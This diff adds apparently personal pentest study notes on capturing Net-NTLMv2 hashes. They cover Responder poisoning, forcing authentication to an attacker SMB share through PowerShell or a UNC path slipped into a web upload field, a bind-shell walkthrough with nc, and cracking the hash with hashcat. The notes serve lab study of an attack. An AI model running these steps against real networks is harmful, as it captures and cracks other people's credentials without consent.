@@ -1,0 +1,31 @@
+- Responder
+	- built in [[SMB]] server that catches authentification
+	- prints all captured Net-NTLMv2 hashes
+	- can include HTTP, FTP, LLMNR (Link-Local Multicast Name Resolution), NBT-NS (NetBIOS Name Service), and MDNS (Multicast DNS) poisoning capablities.
+
+- Force tgt machine to authenticate with owned system
+		- SMB
+			- [PowerShell] **ls \\192.168.119.2\share**
+				- or
+			- **\\192.168.119.2\share\nonexistent.txt**
+				- on Webpage for file upload
+				- [MUST USE escape characters]
+					- i.e. 4x \\ and 2x \
+
+### Cracking
+	- Example:
+
+		1. nc 192.168.50.211 4444
+			- bind shell
+		2. whoami
+		3. net user paul
+			- part of the RDP group but not Admin
+		4. ip a
+			- retrieve a list of all interfaces
+		5. sudo responder -I tap0 
+			1. -I = listening interface 
+		6. dir **\\192.168.119.2\test**
+			- request access to a non-existent SMB share on our Responder SMB server using pauls bind shell
+		7. cat paul.hash
+		8. hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
+			- crack the hash
